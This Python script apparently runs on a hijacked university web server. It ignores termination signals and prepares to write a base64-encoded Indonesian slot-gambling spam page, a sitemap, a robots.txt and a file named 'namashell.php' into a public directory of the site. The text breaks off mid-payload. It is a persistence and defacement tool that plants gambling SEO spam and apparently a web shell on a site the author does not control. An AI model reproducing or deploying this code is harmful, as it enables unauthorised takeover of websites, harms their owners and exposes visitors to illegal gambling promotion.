from __future__ import print_function
import os
import time
import base64
import signal
import sys  # Import the sys module
#nonroot
def signal_handler(signal, frame):
    print('Signal received, but I am not stopping')

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

directory = "/var/www/jurnalfsh/public/-/id-pro-slot"
file_path_index = os.path.join(directory, "index.php")
file_path_page = os.path.join(directory, "namashell.php")
file_path_sitemap = os.path.join(directory, "sitemap.xml")
file_path_robots = os.path.join(directory, "robots.txt")
file_content_index = "PCFET0NUWVBFIGh0bWw+CjxodG1sIGFtcCBsYW5nPSJpZC1JRCIgaXRlbXNjb3BlPSJpdGVtc2NvcGUiIGl0ZW10eXBlPSJodHRwOi8vc2NoZW1hLm9yZy9XZWJQYWdlIj4KCjxoZWFkPgogICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiIC8+CiAgICA8dGl0bGU+MjAgRGFmdGFyIFNpdHVzIElEIFBybyBTbG90IEdhY29yIE1heHdpbiBHYW1wYW5nIE1lbmFuZyBIYXJpIEluaTwvdGl0bGU+CiAgICA8bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0iSUQgUHJvIFNsb3QgR2Fjb3IgbWVueWVkaWFrYW4gZGFmdGFyIGFrdW4gc2xvdCB2aXAgcHJvICYgMjAgc2l0dXMganVkaSBzbG90IG9ubGluZSB0ZXJwZXJjYXlhIG1heHdpbiB0ZXJnYWNvciBnYW1wYW5nIG1lbmFuZyBoYXJpIGluaSB4NTAwIGphY2twb3QuIj4KICAgIDxtZXRhIG5hbWU9ImtleXdvcmRzIiBjb250ZW50PSJJRCBQcm8gU2xvdCwgSUQgUHJvLCBTbG90IElEIFBybywgSUQgUHJvIE9seW1wdXMsIElEIFBybyBTbG90IEdhY29yLCBEYWZ0YXIgSUQgUHJvIFNsb3QiPgogICAgPGxpbmsgcmVsPSJjYW5vbmljYWwiIGhyZWY9Imh0dHBzOi8vanVybmFsZnNoLnVpbnNieS5hYy5pZC9wdWJsaWMvLS9pZC1wcm8tc2xvdC8iIC8+CiAgICA8bWV0YSBuYW1lPSJyb2JvdHMiIGNvbnRlbnQ9ImluZGV4LCBmb2xsb3ciIC8+CiAgICA8bWV0YSBuYW1lPSJjb3B5cmlnaHQiIGNvbnRlbnQ9IklEIFBybyBTbG90Ij4KICAgIDxtZXRhIG5hbWU9InJhdGluZyIgY29udGVudD0iZ2VuZXJhbCIgLz4KICAgIDxtZXRhIG5hbWU9Imdlby5wbGFjZW5hbWUiIGNvbnRlbnQ9IkluZG9uZXNpYSIgLz4KICAgIDxtZXRhIG5hbWU9Imdlby5jb3VudHJ5IiBjb250ZW50PSJJRCIgLz4KICAgIDxtZXRhIG5hbWU9Imxhbmd1YWdlIiBjb250ZW50PSJJRCIgLz4KICAgIDxtZXRhIG5hbWU9InRnbi5uYXRpb24iIGNvbnRlbnQ9IkluZG9uZXNpYSIgLz4KICAgIDxtZXRhIG5hbWU9InJhdGluZyIgY29udGVudD0iZ2VuZXJhbCIgLz4KICAgIDxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iSUQgUHJvIFNsb3QiIC8+CiAgICA8bWV0YSBuYW1lPSJkaXN0cmlidXRpb24iIGNvbnRlbnQ9Imdsb2JhbCIgLz4KICAgIDxtZXRhIG5hbWU9InB1Ymxpc2hlciIgY29udGVudD0iSUQgUHJvIFNsb3QiIC8+CiAgICA8bWV0YSBuYW1lPSJTbHVycCIgY29udGVudD0iYWxsIiAvPgogICAgPG1ldGEgbmFtZT0idGhlbWUtY29sb3IiIGNvbnRlbnQ9IiNlYmViZWIiPgogICAgPG1ldGEgbmFtZT0iZ29vZ2xlLXNpdGUtdmVyaWZpY2F0aW9uIiBjb250ZW50PSI5S0ZXZGU3SV9ZNVNFVVR4QVo2TEY5NktIVS1iSXVyWEtsTXQ3WEJSZUVZIiAvPgogICAgCiAgICA8bWV0YSBuYW1lPSJhcHBsZS1tb2JpbGUtd2ViLWFwcC1jYXBhYmxlIiBjb250ZW50PSJ5ZXMiIC8+CiAgICA8bWV0YSBuYW1lPSJtb2JpbGUtd2ViLWFwcC1jYXBhYmxlIiBjb250ZW50PSJ5ZXMiPgogICAgPG1ldGEgbmFtZT0iYXBwbGUtbW9iaWxlLXdlYi1hcHAtc3RhdHVzLWJhci1zdHlsZSIgY29udGVudD0iI2ViZWJlYiI+CiAgICA8bWV0YSBuYW1lPSJhcHBsZS1tb2JpbGUtd2ViLWFwcC10aXRsZSIgY29udGVudD0iMjAgRGFmdGFyIFNpdHVzIElEIFBybyBTbG90IEdhY29yIE1heHdpbiBHYW1wYW5nIE1lbmFuZyBIYXJpIEluaSI+CiAgICA8bWV0YSBuYW1lPSJIYW5kaGVsZEZyaWVuZGx5IiBjb250ZW50PSJ0cnVlIj4KICAgIDxtZXRhIG5hbWU9Ik1vYmlsZU9wdGltaXplZCIgY29udGVudD0id2lkdGgiPgogICAgPCEtLSBPcGVuIEdyYXBoIC8gRmFjZWJvb2sgLS0+CiAgICA8bWV0YSBwcm9wZXJ0eT0ib2c6dHlwZSIgY29udGVudD0id2Vic2l0ZSI+CiAgICA8bWV0YSBwcm9wZXJ0eT0ib2c6dXJsIiBjb250ZW50PSJodHRwczovL2p1cm5hbGZzaC51aW5zYnkuYWMuaWQvcHVibGljLy0vaWQtcHJvLXNsb3QvIj4KICAgIDxtZXRhIHByb3BlcnR5PSJvZzp0aXRsZSIgY29udGVudD0iMjAgRGFmdGFyIFNpdHVzIElEIFBybyBTbG90IEdhY29yIE1heHdpbiBHYW1wYW5nIE1lbmFuZyBIYXJpIEluaSI+CiAgICA8bWV0YSBwcm9wZXJ0eT0ib2c6aW1hZ2UiIGNvbnRlbnQ9Imh0dHBzOi8vaS5pYmIuY28vdllqZFdnci9Db3B5LW9mLVNhbGluYW4tZGFyaS1QV1UtT25lLTMyNDAtMTA4MC1waWtzZWwtMS5wbmciPgogICAgPCEtLSBGYXZpY29uIC0tPgogICAgPGxpbmsgcmVsPSJodHRwczovL2kuaWJiLmNvL1ZISndMWHQvZmF2LnBuZyI+CiAgICA8bGluayByZWw9Imljb24iIGhyZWY9Imh0dHBzOi8vaS5pYmIuY28vVkhKd0xYdC9mYXYucG5nIiB0eXBlPSJpbWFnZS94LWljb24iIC8+CiAgICA8IS0tIFR3aXR0ZXIgLS0+CiAgICA8bWV0YSBuYW1lPSJ0d2l0dGVyOmNhcmQiIGNvbnRlbnQ9InN1bW1hcnkiIC8+CiAgICA8bWV0YSBuYW1lPSJ0d2l0dGVyOnRpdGxlIiBjb250ZW50PSIyMCBEYWZ0YXIgU2l0dXMgSUQgUHJvIFNsb3QgR2Fjb3IgTWF4d2luIEdhbXBhbmcgTWVuYW5nIEhhcmkgSW5pIiAvPgogICAgPG1ldGEgbmFtZT0idHdpdHRlcjpkZXNjcmlwdGlvbiIgY29udGVudD0iSUQgUHJvIFNsb3QgR2Fjb3IgbWVueWVkaWFrYW4gZGFmdGFyIGFrdW4gc2xvdCB2aXAgcHJvICYgMjAgc2l0dXMganVkaSBzbG90IG9ubGluZSB0ZXJwZXJjYXlhIG1heHdpbiB0ZXJnYWNvciBnYW1wYW5nIG1lbmFuZyBoYXJpIGluaSB4NTAwIGphY2twb3QuIiAvPgogICAgPG1ldGEgbmFtZT0idHdpdHRlcjppbWFnZSIgY29udGVudD0iaHR0cHM6Ly9pLmliYi5jby92WWpkV2dyL0NvcHktb2YtU2FsaW5hbi1kYXJpLVBXVS1PbmUtMzI0MC0xMDgwLXBpa3NlbC0xLnBuZyIgLz4KICAgIDwhLS0gU3RydWN0dXJlIERhdGEgLS0+CgogICAgPHN0eWxlIGFtcC1ib2lsZXJwbGF0ZT4KICAgICAgICBib2R5IHsKICAgICAgICAgICAgLXdlYmtpdC1hbmltYXRpb246IC1hbXAtc3RhcnQgOHMgc3RlcHMoMSwgZW5kKSAwcyAxIG5vcm1hbCBib3RoOwogICAgICAgICAgICAtbW96LWFuaW1hdGlvbjogLWFtcC1zdGFydCA4cyBzdGVwcygxLCBlbmQpIDBzIDEgbm9ybWFsIGJvdGg7CiAgICAgICAgICAgIC1tcy1hbmltYXRpb246IC1hbXAtc3RhcnQgOHMgc3RlcHMoMSwgZW5kKSAwcyAxIG5vcm1hbCBib3RoOwogICAgICAgICAgICBhbmltYXRpb246IC1hbXAtc3RhcnQgOHMgc3RlcHMoMSwgZW5kKSAwcyAxIG5vcm1hbCBib3RoCiAgICAgICAgfQoKICAgICAgICBALXdlYmtpdC1rZXlmcmFtZXMgLWFtcC1zdGFydCB7CiAgICAgICAgICAgIGZyb20gewogICAgICAgICAgICAgICAgdmlzaWJpbGl0eTogaGlkZGVuCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIHRvIHsKICAgICAgICAgICAgICAgIHZpc2liaWxpdHk6IHZpc2libGUKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgQC1tb3ota2V5ZnJhbWVzIC1hbXAtc3RhcnQgewogICAgICAgICAgICBmcm9tIHsKICAgICAgICAgICAgICAgIHZpc2liaWxpdHk6IGhpZGRlbgogICAgICAgICAgICB9CgogICAgICAgICAgICB0byB7CiAgICAgICAgICAgICAgICB2aXNpYmlsaXR5OiB2aXNpYmxlCiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIEAtbXMta2V5ZnJhbWVzIC1hbXAtc3RhcnQgewogICAgICAgICAgICBmcm9tIHsKICAgICAgICAgICAgICAgIHZpc2liaWxpdHk6IGhpZGRlbgogICAgICAgICAgICB9CgogICAgICAgICAgICB0byB7CiAgICAgICAgICAgICAgICB2aXNpYmlsaXR5OiB2aXNpYmxlCiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIEAtby1rZXlmcmFtZXMgLWFtcC1zdGFydCB7CiAgICAgICAgICAgIGZyb20gewogICAgICAgICAgICAgICAgdmlzaWJpbGl0eTogaGlkZGVuCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIHRvIHsKICAgICAgICAgICAgICAgIHZpc2liaWxpdHk6IHZpc2libGUKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgQGtleWZyYW1lcyAtYW1wLXN0YXJ0IHsKICAgICAgICAgICAgZnJvbSB7CiAgICAgICAgICAgICAgICB2aXNpYmlsaXR5OiBoaWRkZW4KICAgICAgICAgICAgfQoKICAgICAgICAgICAgdG8gewogICAgICAgICAgICAgICAgdmlzaWJpbGl0eTogdmlzaWJsZQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgPC9zdHlsZT4KICAgIDxub3NjcmlwdD4KICAgICAgICA8c3R5bGUgYW1wLWJvaWxlcnBsYXRlPgogICAgICAgICAgICBib2R5IHsKICAgICAgICAgICAgICAgIC13ZWJraXQtYW5pbWF0aW9uOiBub25lOwogICAgICAgICAgICAgICAgLW1vei1hbmltYXRpb246IG5vbmU7CiAgICAgICAgICAgICAgICAtbXMtYW5pbWF0aW9uOiBub25lOwogICAgICAgICAgICAgICAgYW5pbWF0aW9uOiBub25lCiAgICAgICAgICAgIH0KICAgICAgICA8L3N0eWxlPgogICAgPC9ub3NjcmlwdD4KCiAgICA8c2NyaXB0IHR5cGU9ImFwcGxpY2F0aW9uL2xkK2pzb24iPgogICAgICAgIHsKICAgICAgICAgICAgIkBjb250ZXh0IjogImh0dHBzOi8vc2NoZW1hLm9yZyIsCiAgICAgICAgICAgICJAdHlwZSI6ICJPcmdhbml6YXRpb24iLAogICAgICAgICAgICAibmFtZSI6ICJJRCBQcm8gU2xvdCIsCiAgICAgICAgICAgICJhbHRlcm5hdGVOYW1lIjogIklEIFBybyBTbG90IiwKICAgICAgICAgICAgInVybCI6ICJodHRwczovL2p1cm5hbGZzaC51aW5zYnkuYWMuaWQvcHVibGljLy0vaWQtcHJvLXNsb3QvSUQgUHJvIFNsb3QvIiwKICAgICAgICAgICAgImRlc2NyaXB0aW9uIjogIklEIFBybyBTbG90IEdhY29yIG1lbnllZGlha2FuIGRhZnRhciBha3VuIHNsb3QgdmlwIHBybyAmIDIwIHNpdHVzIGp1ZGkgc2xvdCBvbmxpbmUgdGVycGVyY2F5YSBtYXh3aW4gdGVyZ2Fjb3IgZ2FtcGFuZyBtZW5hbmcgaGFyaSBpbmkgeDUwMCBqYWNrcG90LiIsCiAgICAgICAgICAgICJjb250YWN0UG9pbnQiOiB7CiAgICAgICAgICAgICAgICAiQHR5cGUiOiAiQ29udGFjdFBvaW50IiwKICAgICAgICAgICAgICAgICJjb250YWN0VHlwZSI6ICJjdXN0b21lciBzZXJ2aWNlIiwKICAgICAgICAgICAgICAgICJhcmVhU2VydmVkIjogIklEIiwKICAgICAgICAgICAgICAgICJhdmFpbGFibGVMYW5ndWFnZSI6ICJJbmRvbmVzaWFuIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgPC9zY3JpcHQ+CgogICAgPCEtLSBMb2FkIEFNUCAtLT4KICAgIDxzY3JpcHQgYXN5bmMgc3JjPSJodHRwczovL2Nkbi5hbXBwcm9qZWN0Lm9yZy92MC5qcyI+PC9zY3JpcHQ+CiAgICA8IS0tIEFuYWx5dGljcyBBTVAgLS0+CiAgICA8c2NyaXB0IGFzeW5jIGN1c3RvbS1lbGVtZW50PSJhbXAtYW5hbHl0aWNzIiBzcmM9Imh0dHBzOi8vY2RuLmFtcHByb2plY3Qub3JnL3YwL2FtcC1hbmFseXRpY3MtMC4xLmpzIj48L3NjcmlwdD4KCiAgICA8c3R5bGUgYW1wLWN1c3RvbT4KICAgICAgICAvKiEgQ1NTICAqLwogICAgICAgIGh0bWw6bm90KFthbXA0YWRzXSkgYm9keSB7CiAgICAgICAgICAgIGhlaWdodDogYXV0bwogICAgICAgIH0KCiAgICAgICAgaHRtbDpub3QoW2FtcDRhZHNdKSBib2R5IHsKICAgICAgICAgICAgbWFyZ2luOiAwCiAgICAgICAgfQoKICAgICAgICBib2R5IHsKICAgICAgICAgICAgLXdlYmtpdC10ZXh0LXNpemUtYWRqdXN0OiAxMDAlOwogICAgICAgICAgICAtbW96LXRleHQtc2l6ZS1hZGp1c3Q6IDEwMCU7CiAgICAgICAgICAgIC1tcy10ZXh0LXNpemUtYWRqdXN0OiAxMDAlOwogICAgICAgICAgICB0ZXh0LXNpemUtYWRqdXN0OiAxMDAlCiAgICAgICAgfQoKICAgICAgICBodG1sLnNpbmdsZWRvYz5ib2R5IHsKICAgICAgICAgICAgb3ZlcmZsb3c6IHZpc2libGUKICAgICAgICB9CgogICAgICAgIGh0bWwuc2luZ2xlZG9jOm5vdCguaW5hYm94KT5ib2R5IHsKICAgICAgICAgICAgcG9zaXRpb246IHJlbGF0aXZlCiAgICAgICAgfQoKICAgICAgICBbaGlkZGVuXSB7CiAgICAgICAgICAgIGRpc3BsYXk6IG5vbmUKICAgICAgICB9CgogICAgICAgIC5lbGVtZW50IHsKICAgICAgICAgICAgZGlzcGxheTogaW5saW5lLWJsb2NrCiAgICAgICAgfQoKICAgICAgICAubGF5b3V0LWZpeGVkIHsKICAgICAgICAgICAgZGlzcGxheTogaW5saW5lLWJsb2NrOwogICAgICAgICAgICBwb3NpdGlvbjogcmVsYXRpdmUKICAgICAgICB9CgogICAgICAgIC5sYXlvdXQtcmVzcG9uc2l2ZSB7CiAgICAgICAgICAgIGRpc3BsYXk6IGJsb2NrOwogICAgICAgICAgICBwb3NpdGlvbjogcmVsYXRpdmUKICAgICAgICB9CgogICAgICAgIC5sYXlvdXQtc2l6ZS1kZWZpbmVkIHsKICAgICAgICAgICAgb3ZlcmZsb3c6IGhpZGRlbgogICAgICAgIH0KCiAgICAgICAgc2l6ZXIgewogICAgICAgICAgICBkaXNwbGF5OiBibG9jawogICAgICAgIH0KCiAgICAgICAgZW0gewogICAgICAgICAgICBjb2xvcjogI2ZmZmZmZjsKICAgICAgICAgICAgZm9udC13ZWlnaHQ6IDcwMDsKICAgICAgICB9CgogICAgICAgIC50YWcgewogICAgICAgICAgICBkaXNwbGF5OiBub25lOwogICAgICAgIH0KCiAgICAgICAgLmZpbGwtY29udGVudCB7CiAgICAgICAgICAgIGRpc3BsYXk6IGJsb2NrOwogICAgICAgICAgICBoZWlnaHQ6IDA7CiAgICAgICAgICAgIG1heC1oZWlnaHQ6IDEwMCU7CiAgICAgICAgICAgIG1heC13aWR0aDogMTAwJTsKICAgICAgICAgICAgbWluLWhlaWdodDogMTAwJTsKICAgICAgICAgICAgbWluLXdpZHRoOiAxMDAlOwogICAgICAgICAgICB3aWR0aDogMDsKICAgICAgICAgICAgbWFyZ2luOiBhdXRvCiAgICAgICAgfQoKICAgICAgICAubGF5b3V0LXNpemUtZGVmaW5lZCAuZmlsbC1jb250ZW50IHsKICAgICAgICAgICAgcG9zaXRpb246IGFic29sdXRlOwogICAgICAgICAgICB0b3A6IDA7CiAgICAgICAgICAgIGxlZnQ6IDA7CiAgICAgICAgICAgIGJvdHRvbTogMDsKICAgICAgICAgICAgcmlnaHQ6IDAKICAgICAgICB9CgogICAgICAgIC5yZXBsYWNlZC1jb250ZW50IHsKICAgICAgICAgICAgcGFkZGluZzogMDsKICAgICAgICAgICAgYm9yZGVyOiBub25lCiAgICAgICAgfQoKICAgICAgICBhbXAtYW5hbHl0aWNzIHsKICAgICAgICAgICAgcG9zaXRpb246IGZpeGVkOwogICAgICAgICAgICB0b3A6IDA7CiAgICAgICAgICAgIHdpZHRoOiAxcHg7CiAgICAgICAgICAgIGhlaWdodDogMXB4OwogICAgICAgICAgICBvdmVyZmxvdzogaGlkZGVuOwogICAgICAgICAgICB2aXNpYmlsaXR5OiBoaWRkZW4KICAgICAgICB9CgogICAgICAgIGJvZHkgewogICAgICAgICAgICAtd2Via2l0LWFuaW1hdGlvbjogLWFtcC1zdGFydCA4cyBzdGVwcygxLCBlbmQpIDBzIDEgbm9ybWFsIGJvdGg7CiAgICAgICAgICAgIC1tb3otYW5pbWF0aW9uOiAtYW1wLXN0YXJ0IDhzIHN0ZXBzKDEsIGVuZCkgMHMgMSBub3JtYWwgYm90aDsKICAgICAgICAgICAgLW1zLWFuaW1hdGlvbjogLWFtcC1zdGFydCA4cyBzdGVwcygxLCBlbmQpIDBzIDEgbm9ybWFsIGJvdGg7CiAgICAgICAgICAgIGFuaW1hdGlvbjogLWFtcC1zdGFydCA4cyBzdGVwcygxLCBlbmQpIDBzIDEgbm9ybWFsIGJvdGgKICAgICAgICB9CgogICAgICAgIC8qISBDU1MgVXNlZCBmcm9tOiBFbWJlZGRlZCAqLwogICAgICAgIGJvZHkgewogICAgICAgICAgICBtYXJnaW46IDA7CiAgICAgICAgICAgIGNvbG9yOiAjZjdmMWYxOwogICAgICAgICAgICBsaW5lLWhlaWdodDogMS40Mjg1NzE0MzsKICAgICAgICAgICAgZm9udDogNDAwIDE2cHgvMjRweCBjb3VyaWVyOwogICAgICAgICAgICB0ZXh0LWFsaWduOiBqdXN0aWZ5OwogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwCiAgICAgICAgfQoKICAgICAgICBhIHsKICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogdHJhbnNwYXJlbnQKICAgICAgICB9CgogICAgICAgIGE6YWN0aXZlLAogICAgICAgIGE6aG92ZXIgewogICAgICAgICAgICBvdXRsaW5lOiAwCiAgICAgICAgfQoKICAgICAgICBoMSB7CiAgICAgICAgICAgIG1hcmdpbjogLjY3ZW0gMDsKICAgICAgICAgICAgZm9udC1zaXplOiAyZW0KICAgICAgICB9CgogICAgICAgIGltZyB7CiAgICAgICAgICAgIGJvcmRlcjogMAogICAgICAgIH0KCiAgICAgICAgQG1lZGlhIHByaW50IHsKCiAgICAgICAgICAgICosCiAgICAgICAgICAgIDphZnRlciwKICAgICAgICAgICAgOmJlZm9yZSB7CiAgICAgICAgICAgICAgICBjb2xvcjogI2ViZWJlYjsKICAgICAgICAgICAgICAgIHRleHQtc2hhZG93OiBub25lOwogICAgICAgICAgICAgICAgYmFja2dyb3VuZDogMCAwOwogICAgICAgICAgICAgICAgLXdlYmtpdC1ib3gtc2hhZG93OiBub25lOwogICAgICAgICAgICAgICAgYm94LXNoYWRvdzogbm9uZQogICAgICAgICAgICB9CgogICAgICAgICAgICBhLAogICAgICAgICAgICBhOnZpc2l0ZWQgewogICAgICAgICAgICAgICAgdGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmUKICAgICAgICAgICAgfQoKICAgICAgICAgICAgYVtocmVmXTphZnRlciB7CiAgICAgICAgICAgICAgICBjb250ZW50OiAiICgiIGF0dHIoaHJlZikgIikiCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGltZyB7CiAgICAgICAgICAgICAgICBwYWdlLWJyZWFrLWluc2lkZTogYXZvaWQKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaW1nIHsKICAgICAgICAgICAgICAgIG1heC13aWR0aDogMTAwJQogICAgICAgICAgICB9CgogICAgICAgICAgICBoMiwKICAgICAgICAgICAgaDMsCiAgICAgICAgICAgIHAgewogICAgICAgICAgICAgICAgb3JwaGFuczogMzsKICAgICAgICAgICAgICAgIHdpZG93czogMwogICAgICAgICAgICB9CgogICAgICAgICAgICBoMiwKICAgICAgICAgICAgaDMgewogICAgICAgICAgICAgICAgcGFnZS1icmVhay1hZnRlcjogYXZvaWQKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgLmtleXdvcmQgewogICAgICAgICAgICBmb250LXdlaWdodDogNzAwOwogICAgICAgICAgICBmb250LWZhbWlseTogYXJpYWw7CiAgICAgICAgICAgIGxldHRlci1zcGFjaW5nOiAuMDJlbQogICAgICAgIH0KCiAgICAgICAgKiB7CiAgICAgICAgICAgIC13ZWJraXQtYm94LXNpemluZzogYm9yZGVyLWJveDsKICAgICAgICAgICAgLW1vei1ib3gtc2l6aW5nOiBib3JkZXItYm94OwogICAgICAgICAgICBib3gtc2l6aW5nOiBib3JkZXItYm94CiAgICAgICAgfQoKICAgICAgICA6YWZ0ZXIsCiAgICAgICAgOmJlZm9yZSB7CiAgICAgICAgICAgIC13ZWJraXQtYm94LXNpemluZzogYm9yZGVyLWJveDsKICAgICAgICAgICAgLW1vei1ib3gtc2l6aW5nOiBib3JkZXItYm94OwogICAgICAgICAgICBib3gtc2l6aW5nOiBib3JkZXItYm94CiAgICAgICAgfQoKICAgICAgICBhIHsKICAgICAgICAgICAgY29sb3I6ICMwMjcyYmQ7CiAgICAgICAgICAgIHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOwogICAgICAgICAgICBmb250LXNpemU6IDE1cHgKICAgICAgICB9CgogICAgICAgIGE6Zm9jdXMsCiAgICAgICAgYTpob3ZlciB7CiAgICAgICAgICAgIGNvbG9yOiAjMzllZTE1OwogICAgICAgICAgICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZQogICAgICAgIH0KCiAgICAgICAgYTpmb2N1cyB7CiAgICAgICAgICAgIG91dGxpbmU6IDVweCBhdXRvIC13ZWJraXQtZm9jdXMtcmluZy1jb2xvcjsKICAgICAgICAgICAgb3V0bGluZS1vZmZzZXQ6IC0ycHgKICAgICAgICB9CgogICAgICAgIGltZyB7CiAgICAgICAgICAgIHZlcnRpY2FsLWFsaWduOiBtaWRkbGUKICAgICAgICB9CgogICAgICAgIGgxLAogICAgICAgIGgyLAogICAgICAgIGgzIHsKICAgICAgICAgICAgZm9udC1mYW1pbHk6IGluaGVyaXQ7CiAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiA1MDA7CiAgICAgICAgICAgIGxpbmUtaGVpZ2h0OiAxLjE7CiAgICAgICAgICAgIGNvbG9yOiAjMjM5ZWU2CiAgICAgICAgfQoKICAgICAgICBoMSwKICAgICAgICBoMiwKICAgICAgICBoMyB7CiAgICAgICAgICAgIG1hcmdpbi10b3A6IDIwcHg7CiAgICAgICAgICAgIG1hcmdpbi1ib3R0b206IDEwcHg7CiAgICAgICAgICAgIGZvbnQtZmFtaWx5OiBSb2JvdG8gTW9ubywgYXJpYWwKICAgICAgICB9CgogICAgICAgIGgxIHsKICAgICAgICAgICAgZm9udC1zaXplOiAzNnB4CiAgICAgICAgfQoKICAgICAgICBoMiB7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMzBweAogICAgICAgIH0KCiAgICAgICAgaDMgewogICAgICAgICAgICBmb250LXNpemU6IDI0cHgKICAgICAgICB9CgogICAgICAgIHAgewogICAgICAgICAgICBtYXJnaW46IDAgMCAxMHB4CiAgICAgICAgfQoKICAgICAgICAuaW5mbyB7CiAgICAgICAgICAgIHBhZGRpbmc6IDhweCA4cHggOHB4IDQwcHg7CiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6IHJnYigyNTUsIDUsIDUpCiAgICAgICAgfQoKICAgICAgICBoMiwKICAgICAgICBoMyB7CiAgICAgICAgICAgIHBhZGRpbmc6IDhweDsKICAgICAgICAgICAgY29sb3I6ICM4MjA5QkY7CiAgICAgICAgICAgIGZvbnQtZmFtaWx5OiBhcmlhbAogICAgICAgIH0KCiAgICAgICAgdWwgewogICAgICAgICAgICBtYXJnaW4tdG9wOiAwOwogICAgICAgICAgICBtYXJnaW4tYm90dG9tOiAxMHB4OwogICAgICAgICAgICBjb2xvcjogIzgyMDlCRjsKICAgICAgICB9CgogICAgICAgIC5saXN0LWZvb3RlciB7CiAgICAgICAgICAgIHBhZGRpbmc6IDEwcHggMDsKICAgICAgICAgICAgY29sb3I6ICMyMTdmZmE7CiAgICAgICAgICAgIHRleHQtdHJhbnNmb3JtOiB1cHBlcmNhc2U7CiAgICAgICAgICAgIGJvcmRlci10b3A6IDFweCBzb2xpZCAjODIwOUJGOwogICAgICAgICAgICBib3JkZXItYm90dG9tOiAxcHggc29saWQgIzgyMDlCRgogICAgICAgIH0KCiAgICAgICAgLmxpc3QtZm9vdGVyIHsKICAgICAgICAgICAgbWFyZ2luOiAxNXB4IDA7CiAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcgogICAgICAgIH0KCiAgICAgICAgLmxpc3QtZm9vdGVyIGxpIHsKICAgICAgICAgICAgZGlzcGxheTogaW5saW5lOwogICAgICAgICAgICBwYWRkaW5nOiAwIDVweDsKICAgICAgICAgICAgYm9yZGVyLWxlZnQ6IDFweCBzb2xpZCAjMzdkMGUxCiAgICAgICAgfQoKICAgICAgICAubGlzdC1mb290ZXIgbGk6Zmlyc3QtY2hpbGQgewogICAgICAgICAgICBib3JkZXI6IG5vbmUKICAgICAgICB9CgogICAgICAgIC5saXN0LWZvb3RlciBsaTpob3ZlciB7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IDAgMAogICAgICAgIH0KCiAgICAgICAgLmNvbnRhaW5lciB7CiAgICAgICAgICAgIHBhZGRpbmctcmlnaHQ6IDE1cHg7CiAgICAgICAgICAgIHBhZGRpbmctbGVmdDogMTVweDsKICAgICAgICAgICAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogICAgICAgICAgICBtYXJnaW4tbGVmdDogYXV0bwogICAgICAgIH0KCiAgICAgICAgQG1lZGlhIChtaW4td2lkdGg6NzY4cHgpIHsKICAgICAgICAgICAgLmNvbnRhaW5lciB7CiAgICAgICAgICAgICAgICB3aWR0aDogNzUwcHgKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgQG1lZGlhIChtaW4td2lkdGg6OTkycHgpIHsKICAgICAgICAgICAgLmNvbnRhaW5lciB7CiAgICAgICAgICAgICAgICB3aWR0aDogOTcwcHgKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgQG1lZGlhIChtaW4td2lkdGg6MTIwMHB4KSB7CiAgICAgICAgICAgIC5jb250YWluZXIgewogICAgICAgICAgICAgICAgd2lkdGg6IDExNzBweAogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICAucm93IHsKICAgICAgICAgICAgbWFyZ2luLXJpZ2h0OiAtMTVweDsKICAgICAgICAgICAgbWFyZ2luLWxlZnQ6IC0xNXB4CiAgICAgICAgfQoKICAgICAgICAuY29sLWxnLTEyLAogICAgICAgIC5jb2wtbWQtMTIsCiAgICAgICAgLmNvbC1tZC0zLAogICAgICAgIC5jb2wtc20tMTIsCiAgICAgICAgLmNvbC14cy0xMiB7CiAgICAgICAgICAgIHBvc2l0aW9uOiByZWxhdGl2ZTsKICAgICAgICAgICAgbWluLWhlaWdodDogMXB4OwogICAgICAgICAgICBwYWRkaW5nLXJpZ2h0OiAxNXB4OwogICAgICAgICAgICBwYWRkaW5nLWxlZnQ6IDE1cHgKICAgICAgICB9CgogICAgICAgIC5jb2wteHMtMTIgewogICAgICAgICAgICBmbG9hdDogbGVmdAogICAgICAgIH0KCiAgICAgICAgLmNvbC14cy0xMiB7CiAgICAgICAgICAgIHdpZHRoOiAxMDAlCiAgICAgICAgfQoKICAgICAgICBAbWVkaWEgKG1pbi13aWR0aDo3NjhweCkgewogICAgICAgICAgICAuY29sLXNtLTEyIHsKICAgICAgICAgICAgICAgIGZsb2F0OiBsZWZ0CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIC5jb2wtc20tMTIgewogICAgICAgICAgICAgICAgd2lkdGg6IDEwMCUKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgQG1lZGlhIChtaW4td2lkdGg6OTkycHgpIHsKCiAgICAgICAgICAgIC5jb2wtbWQtMTIsCiAgICAgICAgICAgIC5jb2wtbWQtMyB7CiAgICAgICAgICAgICAgICBmbG9hdDogbGVmdAogICAgICAgICAgICB9CgogICAgICAgICAgICAuY29sLW1kLTEyIHsKICAgICAgICAgICAgICAgIH